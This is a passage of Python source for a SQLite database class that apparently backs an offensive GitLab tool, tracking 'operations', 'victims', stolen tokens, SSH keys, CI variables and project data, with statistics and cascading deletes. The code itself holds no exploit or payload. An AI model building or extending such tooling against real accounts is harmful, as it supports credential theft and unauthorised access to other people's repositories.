                INSERT INTO protected_branches (project_db_id, name, push_access_levels, 
                                               merge_access_levels, allow_force_push)
                VALUES (?, ?, ?, ?, ?)
            """, (
                project_db_id,
                branch_data.get('name'),
                json.dumps(branch_data.get('push_access_levels', [])),
                json.dumps(branch_data.get('merge_access_levels', [])),
                branch_data.get('allow_force_push', False)
            ))
            return cursor.lastrowid
    
    def get_protected_branches(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all protected branches for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM protected_branches 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== RUNNERS CRUD ====================
    
    def store_runner(self, project_db_id: int, runner_data: Dict[str, Any]) -> int:
        """Store a runner."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO runners (project_db_id, runner_id, description, active, 
                                    is_shared, runner_type)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                runner_data.get('id'),
                runner_data.get('description'),
                runner_data.get('active', False),
                runner_data.get('is_shared', False),
                runner_data.get('runner_type')
            ))
            return cursor.lastrowid
    
    def get_runners(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all runners for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM runners 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== CONTAINER REGISTRY CRUD ====================
    
    def store_container_registry(self, project_db_id: int, registry_data: Dict[str, Any]) -> int:
        """Store a container registry."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO container_registries (project_db_id, registry_id, name, 
                                                  path, location, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                registry_data.get('id'),
                registry_data.get('name'),
                registry_data.get('path'),
                registry_data.get('location'),
                registry_data.get('created_at')
            ))
            return cursor.lastrowid
    
    def get_container_registries(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all container registries for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM container_registries 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== PACKAGES CRUD ====================
    
    def store_package(self, project_db_id: int, package_data: Dict[str, Any]) -> int:
        """Store a package."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO packages (project_db_id, package_id, name, version, 
                                     package_type, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                package_data.get('id'),
                package_data.get('name'),
                package_data.get('version'),
                package_data.get('package_type'),
                package_data.get('created_at')
            ))
            return cursor.lastrowid
    
    def get_packages(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all packages for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM packages 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== STATISTICS ====================
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Get global statistics.
        
        Returns:
            Dictionary with statistics
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            # Total operations
            cursor.execute("SELECT COUNT(*) FROM operations")
            total_operations = cursor.fetchone()[0]
            
            # Active operations
            cursor.execute("""
                SELECT COUNT(*) FROM operations 
                WHERE status = ?
            """, (OperationPhase.RUNNING.value,))
            active_operations = cursor.fetchone()[0]
            
            # Total victims
            cursor.execute("SELECT COUNT(*) FROM victims")
            total_victims = cursor.fetchone()[0]
            
            # Authorized victims
            cursor.execute("""
                SELECT COUNT(*) FROM victims 
                WHERE status = ?
            """, ("authorized",))
            authorized_victims = cursor.fetchone()[0]
            
            # Total tokens
            cursor.execute("SELECT COUNT(*) FROM tokens")
            total_tokens = cursor.fetchone()[0]
            
            # Total projects
            cursor.execute("SELECT COUNT(*) FROM projects")
            total_projects = cursor.fetchone()[0]
            
            # Total SSH keys
            cursor.execute("SELECT COUNT(*) FROM ssh_keys")
            total_ssh_keys = cursor.fetchone()[0]
            
            return {
                'total_operations': total_operations,
                'active_operations': active_operations,
                'total_victims': total_victims,
                'authorized_victims': authorized_victims,
                'total_tokens': total_tokens,
                'total_projects': total_projects,
                'total_ssh_keys': total_ssh_keys
            }
    
    # ==================== DELETE METHODS ====================
    
    def delete_victim(self, victim_id: int) -> bool:
        """
        Delete a victim and all associated data.
        
        This cascades to delete:
        - Tokens
        - Projects (and their CI variables, members, MRs, issues, etc.)
        - Groups (and their members)
        - Snippets
        - SSH keys
        
        Args:
            victim_id: ID of the victim to delete
            
        Returns:
            True if deleted successfully
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            # Get all projects for this victim to delete their related data
            cursor.execute("SELECT id FROM projects WHERE victim_id = ?", (victim_id,))
            project_ids = [row[0] for row in cursor.fetchall()]
            
            # Delete project-related data
            for project_db_id in project_ids:
                cursor.execute("DELETE FROM ci_variables WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM project_members WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM merge_requests WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM issues WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM deploy_keys WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM webhooks WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM protected_branches WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM runners WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM container_registries WHERE project_db_id = ?", (project_db_id,))
                cursor.execute("DELETE FROM packages WHERE project_db_id = ?", (project_db_id,))
            
            # Get all groups for this victim to delete their members
            cursor.execute("SELECT id FROM groups WHERE victim_id = ?", (victim_id,))
            group_ids = [row[0] for row in cursor.fetchall()]
            
            for group_db_id in group_ids:
                cursor.execute("DELETE FROM group_members WHERE group_db_id = ?", (group_db_id,))
            
            # Delete victim-level data
            cursor.execute("DELETE FROM tokens WHERE victim_id = ?", (victim_id,))
            cursor.execute("DELETE FROM projects WHERE victim_id = ?", (victim_id,))
            cursor.execute("DELETE FROM groups WHERE victim_id = ?", (victim_id,))
            cursor.execute("DELETE FROM snippets WHERE victim_id = ?", (victim_id,))
            cursor.execute("DELETE FROM ssh_keys WHERE victim_id = ?", (victim_id,))
            
            # Finally, delete the victim
            cursor.execute("DELETE FROM victims WHERE id = ?", (victim_id,))
            
            logger.info(f"Deleted victim {victim_id} and all associated data")
            return True
    
    def delete_operation(self, operation_id: int) -> bool:
        """
        Delete an operation and all associated data.
        
        This cascades to delete all victims and their data.
        
        Args:
            operation_id: ID of the operation to delete
            
        Returns:
            True if deleted successfully
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            # Get all victims for this operation
            cursor.execute("SELECT id FROM victims WHERE operation_id = ?", (operation_id,))
            victim_ids = [row[0] for row in cursor.fetchall()]
            
            # Delete each victim (which cascades to all their data)
            for victim_id in victim_ids:
                self.delete_victim(victim_id)
            
            # Delete activity log
            cursor.execute("DELETE FROM activity_log WHERE operation_id = ?", (operation_id,))
            
            # Finally, delete the operation
            cursor.execute("DELETE FROM operations WHERE id = ?", (operation_id,))
            
            logger.info(f"Deleted operation {operation_id} and all associated data")
            return True
    
    # ==================== UTILITY METHODS ====================
    
    def _get_access_level_name(self, access_level: Optional[int]) -> Optional[str]:
        """Convert GitLab access level number to name."""
        if access_level is None:
            return None
        access_levels = {
            0: "No access",
            5: "Minimal access",
            10: "Guest",
            20: "Reporter",
            30: "Developer",
            40: "Maintainer",
            50: "Owner"
        }
        return access_levels.get(access_level, f"Unknown ({access_level})")
    
    def _row_to_dict(self, row: sqlite3.Row, 
                    parse_scopes: bool = False) -> Dict[str, Any]:
        """
        Convert SQLite row to dictionary.
        
        Args:
            row: SQLite row object
            parse_scopes: Whether to parse JSON scopes field
            
        Returns:
            Dictionary representation of row
        """
        result = dict(row)
        
        # Parse JSON scopes if present
        if parse_scopes and 'scopes' in result and result['scopes']:
            try:
                result['scopes'] = json.loads(result['scopes'])
            except json.JSONDecodeError:
                logger.warning(f"Failed to parse scopes JSON: {result['scopes']}")
        
        return result
    
    def close(self):
        """Close database connection (for cleanup)."""
        logger.info("Database connection closed")
